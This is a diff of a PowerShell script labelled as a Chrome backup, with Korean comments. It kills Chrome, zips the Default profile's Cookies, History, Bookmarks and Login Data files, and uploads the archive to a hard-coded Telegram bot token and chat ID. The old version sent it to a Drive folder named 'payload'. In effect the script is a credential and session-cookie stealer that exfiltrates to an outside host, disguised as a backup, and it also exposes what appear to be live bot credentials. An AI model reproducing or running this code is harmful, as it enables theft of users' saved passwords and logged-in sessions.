@@ -1,67 +1,104 @@
 # ==== User Configuration ====
-$botToken = "8529187820:AAGN2vlcmLBtf-EaZKWfkR9ufRrVOssQMKo"
-$chatId   = "8121448802"
-$googleDriveFolderPath = "payload"  # Google Drive folder name
+# ⚠️ 보안 경고: 실제 토큰을 입력하세요.
+$botToken = "8529187820:AAGN2vlcmLBtf-EaZKWfkR9ufRrVOssQMKo"  # 예: 123456789:ABC...
+$chatId   = "8121448802"    # 예: 12345678
+# ============================
 
-# ==== 1. Compress Chrome Data ====
-$src = "$env:LOCALAPPDATA\Google\Chrome\User Data"
-$zipPath = "$env:TEMP\ChromeBackup.zip"
+# 1. 경로 설정
+$localAppData = "$env:LOCALAPPDATA\Google\Chrome\User Data"
+$timestamp = (Get-Date).ToString('yyyyMMdd_HHmmss')
+$zipPath = "$env:TEMP\ChromeBackup_$timestamp.zip"
 
-Write-Host "[1/4] Compressing Chrome data..."
-Write-Host "Terminating Chrome processes..."
+Write-Host "==== Chrome Backup Script Started ====" -ForegroundColor Cyan
+
+# 2. Chrome 프로세스 종료
+Write-Host "[1/3] Terminating Chrome processes..." -ForegroundColor Yellow
 Stop-Process -Name chrome -Force -ErrorAction SilentlyContinue
 Start-Sleep -Seconds 1
 
+# 3. 데이터 압축 (비밀번호/쿠키/히스토리/북마크만 포함)
+Write-Host "[2/3] Compressing Chrome data..." -ForegroundColor Yellow
+
 if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
 
-# Compress only essential folders (faster)
-$foldersToCompress = @(
-    "$src\Default\Cookies",
-    "$src\Default\History",
-    "$src\Default\Bookmarks",
-    "$src\Default\Login Data"
+# 백업할 파일 목록 (Local State 파일이 제외되었습니다.)
+$filesToBackup = @(
+    "$localAppData\Default\Cookies",
+    "$localAppData\Default\History",
+    "$localAppData\Default\Bookmarks",
+    "$localAppData\Default\Login Data"
 )
 
-$foldersToCompress | Where-Object { Test-Path $_ } | ForEach-Object {
-    Compress-Archive -Path $_ -DestinationPath $zipPath -Update
+# 존재하는 파일만 필터링하여 압축
+$validFiles = $filesToBackup | Where-Object { Test-Path $_ }
+
+if ($validFiles.Count -eq 0) {
+    Write-Error "Chrome data files not found or path is incorrect."
+    exit
 }
 
-# ==== 2. Upload to Google Drive using rclone ====
-Write-Host "[2/4] Uploading to Google Drive..."
+try {
+    # 효율적인 일괄 압축
+    Compress-Archive -Path $validFiles -DestinationPath $zipPath -Force
+    Write-Host "Backup saved locally at: $zipPath" -ForegroundColor Green
+}
+catch {
+    Write-Error "Compression failed: $_"
+    exit
+}
 
-$timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
-$fileName = "ChromeBackup_$timestamp.zip"
+# 4. 텔레그램으로 파일 직접 전송 (Rclone 대체)
+Write-Host "[3/3] Uploading file to Telegram..." -ForegroundColor Yellow
 
-# Check if rclone is installed
-$rclonePath = "rclone.exe"
-$rcloneCheck = Get-Command $rclonePath -ErrorAction SilentlyContinue
+# PowerShell에서 멀티파트 폼 데이터(파일 업로드)를 처리하는 함수 정의
+function Send-TelegramDocument {
+    param (
+        [string]$token,
+        [string]$chat_id,
+        [string]$filePath
+    )
 
-if ($rcloneCheck) {
+    $url = "https://api.telegram.org/bot$token/sendDocument"
+    $fileItem = Get-Item $filePath
+    
+    # .NET 클래스를 사용하여 파일 업로드 준비
+    Add-Type -AssemblyName 'System.Net.Http'
+    $client = New-Object System.Net.Http.HttpClient
+    $content = New-Object System.Net.Http.MultipartFormDataContent
+    
+    # 파일 스트림 구성
+    $fileStream = [System.IO.File]::OpenRead($filePath)
+    $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
+    $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
+    
+    # 폼 데이터에 파일 및 채팅 ID 추가
+    $content.Add($fileContent, "document", $fileItem.Name)
+    $content.Add((New-Object System.Net.Http.StringContent($chat_id)), "chat_id")
+    $content.Add((New-Object System.Net.Http.StringContent("Chrome Backup Complete! ($timestamp)")), "caption")
+
     try {
-        # Upload using rclone to gdrive:payload folder
-        & $rclonePath copy $zipPath "gdrive:$googleDriveFolderPath" -v
+        $task = $client.PostAsync($url, $content)
+        $task.Wait()
+        $result = $task.Result
         
-        Write-Host "[3/4] Upload successful!"
-        $link = "https://drive.google.com/drive/folders/payload"
-        Write-Host $link
-    } catch {
-        Write-Host "[3/4] Upload failed: $_"
-        Write-Host "File saved locally: $zipPath"
-        $link = $zipPath
+        if ($result.IsSuccessStatusCode) {
+            Write-Host "Upload Successful! Check your Telegram." -ForegroundColor Cyan
+        } else {
+            Write-Error "Upload Failed. Status: $($result.StatusCode)"
+        }
     }
-} else {
-    Write-Host "[3/4] rclone not installed. Using local backup only."
-    Write-Host "Install rclone from: https://rclone.org/downloads/"
-    Write-Host "File saved: $zipPath"
-    $link = $zipPath
+    catch {
+        Write-Error "Network Error: $_"
+    }
+    finally {
+        # 리소스 정리
+        $fileStream.Dispose()
+        $client.Dispose()
+        $content.Dispose()
+    }
 }
 
-# ==== 3. Send to Telegram ====
-Write-Host "[4/4] Sending link to Telegram..."
-$telegramUrl = "https://api.telegram.org/bot$botToken/sendMessage"
-Invoke-RestMethod -Uri $telegramUrl -Method Post -Body @{
-    chat_id = $chatId
-    text    = "Chrome backup link: $link"
-}
+# 함수 실행
+Send-TelegramDocument -token $botToken -chat_id $chatId -filePath $zipPath
 
-Write-Host "Done! Check Telegram for the link."
+Write-Host "==== Process Finished ====" -ForegroundColor Cyan
